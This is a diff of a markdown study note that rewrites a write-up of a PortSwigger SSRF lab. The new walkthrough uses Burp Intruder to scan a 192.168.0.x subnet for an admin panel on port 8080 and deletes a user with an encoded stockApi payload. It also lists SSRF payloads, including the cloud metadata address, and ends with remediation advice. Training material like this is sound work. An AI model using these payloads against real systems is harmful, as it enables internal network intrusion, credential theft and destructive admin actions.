@@ -215,104 +215,272 @@ assets.company.com
 
 ---
 
-# SSRF Lab-2 — Attacking Back-end Systems (Internal targets)
+# 📘 SSRF Lab-2 (Internal Network Scan & Pivoting) — Full Write-Up
+
+## 🟪 One-Line Summary
+> **This SSRF allows scanning internal `192.168.0.X` systems and accessing hidden admin panels on port 8080, leading to full account deletion using an encoded admin payload.**
 
 ---
 
-## 🔹 Overview
-This note covers SSRF attacks targeting internal back-end systems (private IPs / non-routable hosts).  
-SSRF allows an attacker to make the *server* fetch internal admin pages and APIs (e.g., http://192.168.0.68/admin) so they can view or trigger sensitive actions that are normally protected by network isolation.
+## 🟦 What Is This Topic?
+This lab focuses on **SSRF → Internal Network Pivoting**, where the backend fetches URLs supplied by the user.
 
-> Only test these techniques on authorized labs/systems.
+Private internal ranges:
+```
+192.168.0.0 – 192.168.0.255
+10.0.0.0 – 10.255.255.255
+172.16.0.0 – 172.31.255.255
+```
 
----
+These internal hosts typically run:
+- Admin panels  
+- Internal APIs  
+- Dev dashboards  
+- Database interfaces  
+- Message brokers  
+- Cloud metadata  
 
-## 🔹 Short summary
-SSRF makes the server (not your browser) fetch internal admin pages and APIs so you can view or trigger admin-only actions.
-
----
-
-## 🔹 Why internal back-end systems are high value
-- Internal services often assume local requests are trusted and skip strong auth.  
-- Common targets: admin consoles, cloud metadata endpoints, DB HTTP APIs, container APIs, health/actuator endpoints.  
-- Successful SSRF → credential theft, config changes, DB dumps, destructive admin actions.
-
----
-
-## 🔹 Lab description (example)
-The app has a stock-check feature (POST /product/stock) that accepts a stockApi URL the server will fetch.  
-*Goal:* Use SSRF to fetch http://192.168.0.68/admin, find a delete link for user carlos, then invoke it via SSRF to remove the user.
+SSRF allows attackers to **reach these machines as if they are inside the network**.
 
 ---
 
-## 🔹 High-level attack flow
-1. Intercept POST /product/stock and find stockApi.  
-2. Replace stockApi with internal admin URL.  
-3. Inspect returned HTML and extract actionable endpoints.  
-4. Put the action URL back into stockApi and send again to trigger the action.  
-5. Verify the change and collect PoC.
+## 🟥 Why This Matters
+This lab demonstrates the most dangerous real-world SSRF scenario:
+
+- Scan internal networks from outside  
+- Find hidden admin ports  
+- Bypass firewall protections  
+- Access internal dashboards  
+- Delete users without authentication  
+- Perform full internal pivoting  
+
+This is exactly how **Capital One’s SSRF breach** happened.
 
 ---
 
-## 🔹 Exact step-by-step (lab-ready)
+## 🟧 Real-World Scenarios (Where This Happens)
+### 🏦 Banks
+Internal servers serving:
+- AML dashboards  
+- Transaction approval endpoints  
+- Account editing forms  
 
-1. *Capture the stock-check request*  
-   - Intercept the request in Burp Proxy / Repeater.  
-   - Example body:stockApi=http://stock.example.net:8080/product/stock/check?productId=1
-2. *Confirm encoding*  
-- If captured value is percent-encoded (%3A, %2F) use encoded payloads; otherwise use plain.
+### 🏥 Healthcare
+Internal-only:
+- Patient records  
+- Lab systems  
+- FHIR APIs  
 
-3. *Recon: fetch internal admin page*  
-- Replace stockApi with the internal admin page:
-  - Plain: stockApi=http://192.168.0.68/admin
-  - Encoded: stockApi=http%3A%2F%2F192.168.0.68%2Fadmin
-- Send the request and inspect the returned HTML (Raw / Elements).
+### 🛒 E-Commerce
+- Stock management  
+- Inventory admin  
+- Pricing engines  
 
-![SSRF — fetched internal admin page via stockApi](../images/ssrf-lab2-local-admin.png)  
-(Screenshot 1: server fetched internal admin HTML after stockApi was set to the admin URL.)
+### 🏢 Enterprise SaaS
+- Hidden admin panels  
+- Billing engines  
+- Debug dashboards  
 
-4. *Inspect returned HTML / Elements*  
-- Search for delete, username=, action=, hidden tokens, JS-generated links.  
-- Copy the actionable URL (example):http://192.168.0.68:8080/admin/delete?username=carlos
-![SSRF — discovered delete link in returned HTML](../images/ssrf-lab2-found-delete-link.png)  
-(Screenshot 2: HTML/Elements view showing the /delete?username=carlos link.)
+---
 
-5. *Exploit: trigger the action via SSRF*  
-- Put the full actionable URL back into stockApi (encoded if original was encoded):
-  - Plain: stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
-  - Encoded: stockApi=http%3A%2F%2F192.168.0.68%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
-- Send the request — the server will perform the delete.
+## 🟥 Common SSRF Payloads
+```
+http://192.168.0.1/
+http://10.0.0.5:8080/admin
+http://127.0.0.1:5000/
+http://169.254.169.254/latest/meta-data/
+```
+
+---
+
+## 🔥 High-Value Endpoints
+### Internal Admin Paths
+```
+/admin
+/administrator
+/manage
+/dashboard
+/console
+/control
+```
+
+### Critical Ports
+```
+8080 – Admin panels, Tomcat
+8000 – Internal APIs
+5000 – Dev/Flask
+3000 – Node dashboards
+9000 – Dev servers
+9200 – Elasticsearch
+27017 – MongoDB
+```
+
+### Cloud Metadata
+```
+http://169.254.169.254/latest/meta-data/
+```
+
+---
+
+# 🟨 LAB WALKTHROUGH — PortSwigger: SSRF With Internal Network Scan
+
+## 🎯 Goal
+- Scan internal IP range → find admin running on **port 8080**  
+- Access:  
+  `http://192.168.0.X:8080/admin`  
+- Delete user *carlos* using encoded SSRF payload
+
+---
+
+# 🟧 STEP 1 — Intercept the Stock Check Request
+1. Open a product page  
+2. Click **Check Stock**  
+3. Intercept → **Send to Intruder**
+
+You now control:
+```
+stockApi=
+```
+
+---
+
+# 🟦 STEP 2 — Set Internal IP Scan Range
+Modify request to:
+```
+stockApi=http://192.168.0.1:8080/admin
+```
+
+Highlight the last octet (**1**) → click **Add §**.
+
+---
+
+# 🟩 STEP 3 — Configure Intruder Payload
+- Payload type: **Numbers**  
+- From: **1**  
+- To: **255**  
+- Step: **1**
+
+You will now scan the entire subnet.
+
+---
+
+# 🟥 STEP 4 — Run The Scan
+Click **Start Attack**
+
+Sort by **Status**:
+
+- Most responses: `500 / 404 / 302`
+- Exactly **one response**: `200 OK`
+
+This means **this IP hosts the admin panel**.
+
+### 🖼 Evidence Screenshot #1 (Found Admin IP)
+```
+[ Insert screenshot showing the 200 OK IP discovered during Intruder scan ]
+```
+
+Example discovered target:
+```
+http://192.168.0.57:8080/admin
+```
+
+---
+
+# 🟧 STEP 5 — Access Admin Panel via SSRF
+Send the 200 OK request to **Repeater**.
+
+Check:
+```
+stockApi=http://192.168.0.57:8080/admin
+```
+
+Repeater returns **admin page HTML** → SSRF working.
+
+---
+
+# 🟩 STEP 6 — Delete the User (Encoded Payload)
+The admin delete function typically looks like:
+```
+/admin/delete?username=carlos
+```
+
+But due to firewall/WAF, we encode the query string:
+
+```
+/admin/delete%3Fusername%3Dcarlos
+```
+
+Final exploit:
+```
+stockApi=http://192.168.0.57:8080/admin/delete%3Fusername%3Dcarlos
+```
+
+Send → user **carlos deleted** → **Lab solved**.
+
+### 🖼 Evidence Screenshot #2 (Encoded Delete Payload)
 
 ![SSRF — triggered delete via stockApi, verified carlos removed](../images/ssrf-lab2-solved.png)  
-(Screenshot 3: final SSRF request/response showing the delete action executed and confirmation.)
-
-6. *Verify & collect evidence*  
-- Fetch an admin users page via stockApi to confirm removal and save raw requests/responses and timestamps as PoC.
+(Screenshot 1: final SSRF request/response showing the delete action executed and confirmation.)
 
 ---
 
-## 🔹 Example payloads (copy/paste)
+# 🟫 Why This Lab Is Vulnerable
+- Backend trusts internal networks  
+- Server fetches URLs directly from user input  
+- No allowlist  
+- No internal IP filtering  
+- Admin panel on 8080 does not require authentication  
 
-*Plain*
-stockApi=http://192.168.0.68/admin
-stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
-*Encoded*
-stockApi=http%3A%2F%2F192.168.0.68%2Fadmin 
-stockApi=http%3A%2F%2F192.168.0.68%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
----
-
-## 🔹 Real-world chaining & impact
-- SSRF → cloud metadata (169.254.169.254) → credential theft.  
-- SSRF → internal DB APIs → data exfiltration.  
-- SSRF → create admin user / change config → full takeover.
+This is **real pentesting gold**.
 
 ---
 
-## 🔹 Defenses & reporting
-- Use allow-lists for outbound hosts and block internal ranges (127/8, 10/8, 169.254.169.254, ::1, 192.168/16).  
-- Canonicalize & validate user-supplied URLs.  
-- Use an egress proxy that filters outgoing requests.  
-- Enforce authentication/authorization even for local requests and log outbound requests.
+# ⭐ Real-World Pentesting Knowledge From This Lab
+You learned:
+- Internal IP scanning via SSRF  
+- Identifying reachable internal services  
+- Pivoting deeper into the network  
+- Admin dashboard abuse  
+- Query parameter encoding to bypass filters  
+
+This is 1:1 with real-world SSRF exploitation.
 
 ---
 
+# 🟩 Remediation
+### ✔ URL Allowlist
+Allow only:
+```
+https://api.company.com
+```
+
+### ✔ Block Internal IP Ranges (RFC1918)
+```
+10.0.0.0/8
+192.168.0.0/16
+172.16.0.0/12
+```
+
+### ✔ Egress Firewall Filtering
+Block server from accessing:
+- metadata endpoints  
+- internal admin ports  
+- dev servers  
+
+### ✔ Strip dangerous protocols
+No:
+```
+file://
+gopher://
+ftp://
+```
+
+### ✔ Validate then resolve domain
+Resolve DNS → check IP → confirm it’s allowed.
+
+---
+
+# 🟪 Mental Model Summary
+> If you can control even one URL parameter → you control the server’s internal browser → scan & attack the entire internal network.
+
+---
